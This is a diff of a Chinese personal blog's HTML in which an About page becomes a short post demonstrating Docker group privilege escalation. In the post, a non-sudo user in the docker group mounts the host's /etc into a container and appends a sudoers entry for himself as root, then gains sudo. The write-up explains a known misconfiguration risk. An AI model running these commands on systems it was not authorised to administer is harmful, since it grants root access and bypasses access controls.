@@ -12,17 +12,32 @@
 
     <!-- Open Graph -->
     <meta property="og:title"
-        content="About - Cheney.Yin的博客 | Cheney Blog">
+        content="Docker提权案例 - Cheney.Yin的博客 | Cheney Blog">
     
-    <meta property="og:type" content="website">
-    <meta property="og:description"
-        content="「To explore or to exploite is a question.」">
+    <meta property="og:type" content="article">
+    <meta property="og:description" content="docker 提权案例
+">
+    
+    <meta property="article:published_time" content=" 2022-06-21T00:00:00Z">
+    
+    
+    <meta property="article:author" content="Cheney.Yin">
+    
+    
+    <meta property="article:tag" content="Docker">
+    
+    <meta property="article:tag" content="提权">
+    
+    <meta property="article:tag" content="用户组">
+    
+    <meta property="article:tag" content="sudo">
+    
     
     <meta property="og:image" content="https://cheneyyin.github.io/img/cheney.jpg">
-    <meta property="og:url" content="https://cheneyyin.github.io/about/">
+    <meta property="og:url" content="https://cheneyyin.github.io/2022/06/21/docker-privilege-escalating/">
     <meta property="og:site_name" content="Cheney.Yin的博客 | Cheney Blog">
 
-    <title>About - Cheney.Yin的博客 | Cheney Blog</title>
+    <title>Docker提权案例 - Cheney.Yin的博客 | Cheney Blog</title>
 
     <!-- Web App Manifest -->
     <link rel="manifest" href="/pwa/manifest.json">
@@ -31,7 +46,7 @@
     <link rel="shortcut icon" href="/img/favicon.ico">
 
     <!-- Canonical URL -->
-    <link rel="canonical" href="https://cheneyyin.github.io/about/">
+    <link rel="canonical" href="https://cheneyyin.github.io/2022/06/21/docker-privilege-escalating/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href=" /css/bootstrap.min.css">
@@ -194,99 +209,217 @@
   </div>
 </div>
 
-    <!-- Page Header -->
+    <!-- Post Header -->
 
 
 
 <style type="text/css">
     header.intro-header{
         position: relative;
-        background-image: url('/img/bg-me-2022.jpg');
+        background-image: url('/img/bg-material.jpg');
         background: ;
     }
 
-    
-    header.intro-header .header-mask{
-        width: 100%;
-        height: 100%;
-        position: absolute;
-        background: rgba(0,0,0, 0.3);
-    }
     
 </style>
 
 
 
 
+<header class="intro-header" >
 
-
-
-<header class="intro-header" style="background-image: url('/img/bg-me-2022.jpg')">
-  <div class="header-mask"></div>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        
-        <div class="site-heading">
-        
-          <h1>About</h1>
-          <span class="subheading">「To explore or to exploite is a question.」</span>
+    <div class="header-mask"></div>
+    
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/archive/?tag=Docker" title="Docker">Docker</a>
+                        
+                        <a class="tag" href="/archive/?tag=%E6%8F%90%E6%9D%83" title="提权">提权</a>
+                        
+                        <a class="tag" href="/archive/?tag=%E7%94%A8%E6%88%B7%E7%BB%84" title="用户组">用户组</a>
+                        
+                        <a class="tag" href="/archive/?tag=sudo" title="sudo">sudo</a>
+                        
+                    </div>
+                    <h1>Docker提权案例</h1>
+                    
+                    <h2 class="subheading">介绍一种docker提权场景</h2>
+                    <span class="meta">Posted by Cheney.Yin on June 21, 2022</span>
+                </div>
+            </div>
         </div>
-      </div>
     </div>
-  </div>
 </header>
 
 
 
-<!-- Main Content -->
-<div class="container">
-  <div class="row">
-    
-
-    <!-- USE SIDEBAR -->
-    <!-- PostList Container -->
-    <div class="col-lg-8 col-lg-offset-1 col-md-8 col-md-offset-1 col-sm-12
-      col-xs-12 postlist-container">
-      <!-- Chinese Version -->
-<div class="zh post-container">
-    
-    
-
-</div>
 
 
-<!-- disqus 评论框 start -->
-<div class="comment">
-    <div id="disqus_thread" class="disqus-thread">
-
-    </div>
-</div>
-<!-- disqus 评论框 end -->
-
-<script type="text/javascript">
-    /* * * CONFIGURATION VARIABLES * * */
-    var disqus_shortname = "cheneyyin";
-    var disqus_identifier = "cheneyyin//about/";
-    var disqus_url = "https://cheneyyin.github.io/about/";
-
-    (function () {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-</script>
 
 
-    </div>
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <!-- Multi-Lingual -->
+                
+
+				<h1 id="docker-提权案例">docker 提权案例</h1>
+
+<p>假设存在用户<code class="language-plaintext highlighter-rouge">tom</code>，该用户无法<code class="language-plaintext highlighter-rouge">sudo</code>，但属于<code class="language-plaintext highlighter-rouge">docker</code>组。
+首先，创建用户，</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>useradd <span class="nt">-m</span> tom
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>查看用户当前信息，</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">id </span>tom
+<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>tom<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>tom<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>tom<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>将用户加入到<code class="language-plaintext highlighter-rouge">docker</code>组，</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>gpasswd <span class="nt">-a</span> tom docker
+Adding user tom to group docker
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>查看用户信息，可以看到已经成功加入组。</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">id </span>tom
+<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>tom<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>tom<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>tom<span class="o">)</span>,1001<span class="o">(</span>docker<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>切换登录<code class="language-plaintext highlighter-rouge">tom</code>，可以成功执行<code class="language-plaintext highlighter-rouge">docker</code>相关命令。</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>su tom
+<span class="o">[</span>tom@cheney-hp cheney]<span class="nv">$ </span>docker ps <span class="nt">-a</span>
+CONTAINER ID   IMAGE      COMMAND                  CREATED        STATUS                           PORTS     NAMES
+5facb46f63a9   registry   <span class="s2">"/entrypoint.sh /etc…"</span>   20 hours ago   Exited <span class="o">(</span>2<span class="o">)</span> 19 hours ago                    registry
+e27bbc62b96c   busybox    <span class="s2">"sh"</span>                     25 hours ago   Exited <span class="o">(</span>137<span class="o">)</span> About an hour ago             busybox
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>目前，用户<code class="language-plaintext highlighter-rouge">tom</code>无法执行<code class="language-plaintext highlighter-rouge">sudo</code>。</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="nb">sudo </span>ip addr
+tom is not <span class="k">in </span>the sudoers file.  This incident will be reported.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>接下来，我们借助<code class="language-plaintext highlighter-rouge">docker</code>进行提权。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>tom@cheney-hp cheney]<span class="nv">$ </span>docker run <span class="nt">-itd</span> <span class="nt">-v</span> /etc:/etc <span class="nt">--name</span> ubuntu ubuntu /bin/bash
+b0483f78382d8413a7a6d6e9bc8ceb62fe8819c3ffced1907d7fac95b3034e66
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>把本地<code class="language-plaintext highlighter-rouge">/etc</code>映射进容器，进入容器后，登录用户为<code class="language-plaintext highlighter-rouge">root</code>。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>tom@cheney-hp cheney]<span class="nv">$ </span>docker <span class="nb">exec</span> <span class="nt">-it</span> ubuntu /bin/bash
+root@b0483f78382d:/#
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>在容器内把<code class="language-plaintext highlighter-rouge">tom</code>加入到<code class="language-plaintext highlighter-rouge">sudoers</code>文件，</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@b0483f78382d:/# <span class="nb">echo</span> <span class="s1">'tom ALL=(ALL) ALL'</span> <span class="o">&gt;&gt;</span> /etc/sudoers
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>退出容器，测试是否可以正常执行<code class="language-plaintext highlighter-rouge">sudo</code>。</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="o">[</span>tom@cheney-hp cheney]<span class="nv">$ </span><span class="nb">sudo </span>ip addr
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>tom:
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host
+       valid_lft forever preferred_lft forever
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>背后原理，后续补充。</p>
+
+
+                <hr style="visibility: hidden;">
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2022/05/30/docker-registry/" data-toggle="tooltip" data-placement="top" title="简易Docker仓库">
+                        Previous<br>
+                        <span>简易Docker仓库</span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+                <hr style="visibility: hidden;">
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+                
+            </div>  
+
+    <!-- Side Catalog Container -->
+        
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+        
+
     <!-- Sidebar Container -->
-    <div class="col-lg-3 col-lg-offset-0 col-md-3 col-md-offset-0 col-sm-12
-      col-xs-12 sidebar-container">
-      <!-- Featured Tags -->
-      
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
 
 
 <section>
+    
+        <hr class="hidden-sm hidden-xs">
     
     <h5><a href="/archive/">FEATURED TAGS</a></h5>
     <div class="tags">
@@ -329,87 +462,77 @@
 </section>
 
 
-      <!-- Short About -->
-      <section class="visible-md visible-lg">
-  <hr>
-  <h5><a href="/about/">ABOUT ME</a></h5>
-  <div class="short-about">
-    
-    <img src="/img/cheney.jpg" />
-    
-    
-    <p>呆若MUJI</p>
-    
-    <!-- SNS Link -->
-    
-
-
-<ul class="list-inline">
-
-
-  
-  
-  
-  <li>
-    <a target="_blank" href="https://www.zhihu.com/people/cheney-yin-77">
-      <span class="fa-stack fa-lg">
-        <i class="fa fa-circle fa-stack-2x"></i>
-        <i class="fa  fa-stack-1x fa-inverse">知</i>
-      </span>
-    </a>
-  </li>
-  
-  
-  
-  
-  <li>
-    <a target="_blank" href="https://github.com/CheneyYin">
-      <span class="fa-stack fa-lg">
-        <i class="fa fa-circle fa-stack-2x"></i>
-        <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-      </span>
-    </a>
-  </li>
-  
-  
-</ul>
-  </div>
-</section>
-
-      <!-- Friends Blog -->
-      
+                <!-- Friends Blog -->
+                
 <hr>
 <h5>FRIENDS</h5>
 <ul class="list-inline">
   
 </ul>
 
-
+            </div>
+        </div>
     </div>
-    
-  </div>
-</div>
+</article>
+
+<!-- add support for mathjax by voleking-->
 
 
-<!-- Add support for Mathjax by Voleking-->
-<!-- If you want to see formulars well in post preview, Maybe you should add this.-->
-<!-- However, most of the time formulars may not appear in the post preview, you can delete it.-->
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    TeX: {
-      equationNumbers: {
-        autoNumber: "AMS"
-      }
-    },
-    tex2jax: {
-      inlineMath: [ ['$','$'] ],
-      displayMath: [ ['$$','$$'] ],
-      processEscapes: true,
-    }
-  });
+
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "cheneyyin";
+    var disqus_identifier = "/2022/06/21/docker-privilege-escalating";
+    var disqus_url = "https://cheneyyin.github.io/2022/06/21/docker-privilege-escalating/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
 </script>
-<script type="text/javascript"
-  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'right',
+          // icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
 
 
 
@@ -554,7 +677,7 @@
     function generateCatalog(selector) {
 
         // interop with multilangual 
-        if ('false' == 'true') {
+        if ('' == 'true') {
             _containerSelector = 'div.post-container.active'
         } else {
             _containerSelector = 'div.post-container'
